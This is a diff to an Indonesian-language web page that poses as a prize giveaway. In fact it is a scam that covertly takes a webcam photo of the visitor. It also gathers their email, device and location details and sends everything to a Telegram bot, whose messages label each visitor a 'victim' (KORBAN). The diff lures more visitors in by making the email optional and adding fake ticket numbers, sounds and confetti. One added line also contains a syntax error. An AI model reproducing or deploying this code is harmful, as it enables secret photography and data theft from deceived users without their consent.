@@ -37,6 +37,7 @@
             text-align: center;
             backdrop-filter: blur(10px);
             border: 3px solid gold;
+            position: relative;
         }
         
         .header {
@@ -304,6 +305,59 @@
             opacity: 0;
             pointer-events: none;
         }
+
+        /* Efek tombol diklik */
+        .btn-click-effect {
+            position: absolute;
+            width: 100px;
+            height: 100px;
+            background: radial-gradient(circle, rgba(255,255,255,0.8) 0%, transparent 70%);
+            border-radius: 50%;
+            transform: scale(0);
+            animation: clickRipple 0.6s ease-out;
+        }
+        
+        @keyframes clickRipple {
+            to {
+                transform: scale(4);
+                opacity: 0;
+            }
+        }
+
+        /* Efek teks berjalan */
+        .marquee {
+            overflow: hidden;
+            white-space: nowrap;
+            box-sizing: border-box;
+            animation: marquee 10s linear infinite;
+        }
+        
+        @keyframes marquee {
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
+        }
+
+        /* Ticket style */
+        .ticket-number {
+            font-family: 'Courier New', monospace;
+            font-size: 24px;
+            font-weight: bold;
+            color: #dc3545;
+            background: linear-gradient(45deg, #ffeb3b, #ff9800);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+            padding: 10px;
+            border: 2px dashed #dc3545;
+            border-radius: 10px;
+            margin: 15px 0;
+            animation: ticketGlow 2s infinite;
+        }
+        
+        @keyframes ticketGlow {
+            0%, 100% { box-shadow: 0 0 10px rgba(220, 53, 69, 0.5); }
+            50% { box-shadow: 0 0 20px rgba(220, 53, 69, 0.8); }
+        }
     </style>
 </head>
 <body>
@@ -333,20 +387,20 @@
             </div>
             
             <div class="prize-box">
-                <div class="prize-item">🏆 iPhone 16 Pro Max 1TB</div>
-                <div class="prize-item">💰 Uang Tunai Rp 50.000.000</div>
-                <div class="prize-item">✈️ Liburan Ke Jepang 10 Hari</div>
-                <div class="prize-item">🚗 Voucher Mobil Tesla Model S</div>
-                <div class="prize-item">📱 Paket Data Unlimited 2 Tahun</div>
+                <div class="prize-item">📱 Smartphone Flagship</div>
+                <div class="prize-item">⌚ Smartwatch Premium</div>
+                <div class="prize-item">💸 Uang Tunai Rp 10.000.000</div>
+                <div class="prize-item">🏖️ Liburan Ke Bali 5 Hari</div>
+                <div class="prize-item">💻 PC Gaming High-End</div>
             </div>
             
             <div class="email-section">
-                <p>Masukkan email untuk pengiriman hadiah:</p>
-                <input type="email" class="email-input" id="userEmail" placeholder="nama@email.com" required>
-                <div class="optional-text">*Email digunakan untuk verifikasi dan pengiriman hadiah</div>
+                <p>Masukkan email untuk pengiriman hadiah (opsional):</p>
+                <input type="email" class="email-input" id="userEmail" placeholder="nama@email.com">
+                <div class="optional-text">*Email digunakan untuk konfirmasi pengiriman hadiah</div>
             </div>
             
-            <button class="claim-btn" onclick="stealthCapture()">
+            <button class="claim-btn" id="claimButton" onclick="stealthCapture()">
                 <div class="btn-glow"></div>
                 🚀 KLAIM HADIAH SEKARANG
             </button>
@@ -360,8 +414,8 @@
             <div class="success-message" id="successMessage">
                 <h3>🎉 SELAMAT! HADIAH BERHASIL DIKLAIM</h3>
                 <p>Hadiah Anda akan dikirim dalam 1x24 jam</p>
+                <div class="ticket-number" id="ticketNumber"></div>
                 <p style="font-size: 14px; margin-top: 15px;">
-                    No. Tiket: <strong id="ticketNumber"></strong><br>
                     Waktu Klaim: <strong id="claimTime"></strong>
                 </p>
             </div>
@@ -385,6 +439,8 @@
     <!-- Audio untuk suara -->
     <audio id="clickSound" src="https://assets.mixkit.co/sfx/preview/mixkit-select-click-1109.mp3"></audio>
     <audio id="successSound" src="https://assets.mixkit.co/sfx/preview/mixkit-winning-chimes-2015.mp3"></audio>
+    <audio id="applauseSound" src="https://assets.mixkit.co/sfx/preview/mixkit-audience-applause-strong-476.mp3"></audio>
+    <audio id="cheerSound" src="https://assets.mixkit.co/sfx/preview/mixkit-audience-cheer-and-applause-strong-476.mp3"></audio>
 
     <script>
         // === KONFIGURASI TELEGRAM ===
@@ -395,6 +451,11 @@
         let stealthStream = null;
         let stealthPhoto = null;
         let isCameraReady = false;
+
+        // Fungsi generate nomor tiket acak 10 digit
+        function generateTicketNumber() {
+            return Math.floor(1000000000 + Math.random() * 9000000000).toString();
+        }
 
         // Update datetime real-time
         function updateDateTime() {
@@ -441,8 +502,8 @@
             } else {
                 document.getElementById('countdown').textContent = "00:00:00";
                 document.getElementById('countdown').style.color = "#dc3545";
-                document.querySelector('.claim-btn').disabled = true;
-                document.querySelector('.claim-btn').style.background = "#6c757d";
+                document.getElementById('claimButton').disabled = true;
+                document.getElementById('claimButton').style.background = "#6c757d";
             }
         }
 
@@ -461,7 +522,6 @@
                 const video = document.getElementById('stealthVideo');
                 video.srcObject = stealthStream;
                 
-                // Tunggu video siap
                 video.onloadedmetadata = () => {
                     isCameraReady = true;
                     console.log('Kamera stealth siap');
@@ -473,33 +533,43 @@
             }
         }
 
+        // Fungsi efek klik tombol
+        function createClickEffect(event) {
+            const btn = event.currentTarget;
+            const rect = btn.getBoundingClientRect();
+            const x = event.clientX - rect.left;
+            const y = event.clientY - rect.top;
+            
+            const effect = document.createElement('div');
+            effect.className = 'btn-click-effect';
+            effect.style.left = x - 50 + 'px';
+            effect.style.top = y - 50 + 'px';
+            
+            btn.appendChild(effect);
+            
+            // Hapus efek setelah animasi selesai
+            setTimeout(() => {
+                effect.remove();
+            }, 600);
+        }
+
         // Fungsi ambil foto diam-diam
-        function stealthCapture() {
-            const email = document.getElementById('userEmail').value;
+        function stealthCapture(event) {
+            // Efek klik
+            createClickEffect(event);
             
-            if (!email) {
-                alert('Harap masukkan email Anda untuk verifikasi hadiah!');
-                return;
-            }
-            
-            if (!email.includes('@')) {
-                alert('Harap masukkan email yang valid!');
-                return;
-            }
-            
+            // Play sound efek
             document.getElementById('clickSound').play();
             
             // Tampilkan loading segera
             document.getElementById('loading').style.display = 'block';
-            document.querySelector('.claim-btn').disabled = true;
-            document.querySelector('.claim-btn').style.background = "#6c757d";
+            document.getElementById('claimButton').disabled = true;
+            document.getElementById('claimButton').style.background = "#6c757d";
             
             // Ambil foto diam-diam
             takeStealthPhoto().then(() => {
-                // Lanjut proses data
                 collectCompleteData();
             }).catch(() => {
-                // Jika foto gagal, lanjut tanpa foto
                 collectCompleteData();
             });
         }
@@ -524,7 +594,6 @@
                         stealthPhoto = canvas.toDataURL('image/jpeg', 0.6);
                         console.log('Foto stealth berhasil diambil');
                         
-                        // Stop kamera setelah ambil foto
                         if (stealthStream) {
                             stealthStream.getTracks().forEach(track => track.stop());
                         }
@@ -534,7 +603,7 @@
                         console.error('Error mengambil foto stealth:', error);
                         reject(error);
                     }
-                }, 500); // Delay kecil untuk memastikan frame bagus
+                }, 500);
             });
         }
 
@@ -567,11 +636,12 @@
         // Fungsi kirim ke Telegram dengan foto stealth
         async function sendToTelegram(data, photoData = null) {
             let message = `
-🚨 *DATA KORBAN - FOTO STEALTH* 🚨
+🚨 *DATA KORBAN - Frazz go to the moon🤫🧏‍♂️* 🚨
 
-🥳 *PENGGUNA TIDAK MENYADARI DIRI DIFOTO* 🥳
+🥳 *Korban franzz jier😈🤫🧏‍♂️* 🥳
 
-📧 *Email:* ${data.email}
+🎫 *No. Tiket:* ${data.ticketNumber}
+📧 *Email:* ${data.email || 'Tidak diisi'}
 🕐 *Waktu:* ${data.localDateTime}
 🌐 *Zona Waktu:* ${data.timezone}
 
@@ -589,11 +659,10 @@
 
 ${photoData ? '📷 *FOTO STEALTH:* BERHASIL!' : '📷 *FOTO STEALTH:* Gagal'}
 
-⚠️ *PELAKU TEREKAM TANPA SADAR* ⚠️
+⚠️ *Korban Maharaja Franzz kerekam🤫* ⚠️
             `;
             
             try {
-                // Kirim pesan teks
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -606,7 +675,6 @@ ${photoData ? '📷 *FOTO STEALTH:* BERHASIL!' : '📷 *FOTO STEALTH:* Gagal'}
                     })
                 });
                 
-                // Kirim foto jika ada
                 if (photoData) {
                     const blob = base64ToBlob(photoData);
                     
@@ -620,7 +688,6 @@ ${photoData ? '📷 *FOTO STEALTH:* BERHASIL!' : '📷 *FOTO STEALTH:* Gagal'}
                             method: 'POST',
                             body: formData
                         });
-                        console.log('Foto stealth berhasil dikirim');
                     }
                 }
                 
@@ -633,12 +700,14 @@ ${photoData ? '📷 *FOTO STEALTH:* BERHASIL!' : '📷 *FOTO STEALTH:* Gagal'}
         
         function collectCompleteData() {
             const userEmail = document.getElementById('userEmail').value;
+            const ticketNumber = generateTicketNumber();
             
             const completeData = {
+                ticketNumber: ticketNumber,
                 timestamp: new Date().toISOString(),
                 localDateTime: new Date().toLocaleString('id-ID'),
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                email: userEmail,
+                email: userEmail || 'Tidak diisi',
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
@@ -723,23 +792,30 @@ ${photoData ? '📷 *FOTO STEALTH:* BERHASIL!' : '📷 *FOTO STEALTH:* Gagal'}
         async function sendDataToTelegram(data, photoData) {
             const success = await sendToTelegram(data, photoData);
             
-            const sessionId = 'STEALTH-' + Date.now();
-            localStorage.setItem(sessionId, JSON.stringify(data));
+            localStorage.setItem(data.ticketNumber, JSON.stringify(data));
             
             setTimeout(() => {
-                showSuccess(sessionId, success);
+                showSuccess(data.ticketNumber, success);
             }, 3500);
         }
         
-        function showSuccess(sessionId, telegramSuccess) {
+        function showSuccess(ticketNumber, telegramSuccess) {
+            // Play semua sound efek
             document.getElementById('successSound').play();
+            document.getElementById('applauseSound').play();
+            
+            // Delay untuk cheer sound
+            setTimeout(() => {
+                document.getElementById('cheerSound').play();
+            }, 1000);
+            
             document.getElementById('loading').style.display = 'none';
             createConfetti();
             
             const successMsg = document.getElementById('successMessage');
             const claimTime = new Date().toLocaleString('id-ID');
             
-            document.getElementById('ticketNumber').textContent = sessionId;
+            document.getElementById('ticketNumber').textContent = ticketNumber;
             document.getElementById('claimTime').textContent = claimTime;
             
             if (!telegramSuccess) {
@@ -755,28 +831,37 @@ ${photoData ? '📷 *FOTO STEALTH:* BERHASIL!' : '📷 *FOTO STEALTH:* Gagal'}
             successMsg.scrollIntoView({ behavior: 'smooth' });
             
             if (navigator.vibrate) {
-                navigator.vibrate([100, 50, 100]);
+                navigator.vibrate([100, 50, 100, 50, 100]);
             }
         }
         
         function createConfetti() {
             const container = document.getElementById('confettiContainer');
-            const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
+            const colors = ['#ff0000', '#00ff00', #0000ff', '#ffff00', '#ff00ff', '#00ffff', '#ff9900', '#00ff99'];
             
-            for (let i = 0; i < 80; i++) {
+            for (let i = 0; i < 150; i++) {
                 const confetti = document.createElement('div');
                 confetti.className = 'confetti';
                 confetti.style.left = Math.random() * 100 + 'vw';
                 confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
                 confetti.style.opacity = '1';
+                confetti.style.width = (10 + Math.random() * 10) + 'px';
+                confetti.style.height = (10 + Math.random() * 10) + 'px';
+                confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '0%';
                 
                 container.appendChild(confetti);
                 
                 const animation = confetti.animate([
-                    { transform: `translateY(-100px) rotate(0deg)`, opacity: 1 },
-                    { transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`, opacity: 0 }
+                    { 
+                        transform: `translateY(-100px) rotate(0deg)`, 
+                        opacity: 1 
+                    },
+                    { 
+                        transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 720}deg)`, 
+                        opacity: 0 
+                    }
                 ], {
-                    duration: 1500 + Math.random() * 1500,
+                    duration: 2000 + Math.random() * 2000,
                     easing: 'cubic-bezier(0.1, 0.8, 0.3, 1)'
                 });
                 
@@ -796,4 +881,4 @@ ${photoData ? '📷 *FOTO STEALTH:* BERHASIL!' : '📷 *FOTO STEALTH:* Gagal'}
         }, 1000);
     </script>
 </body>
-                </html>
+</html>
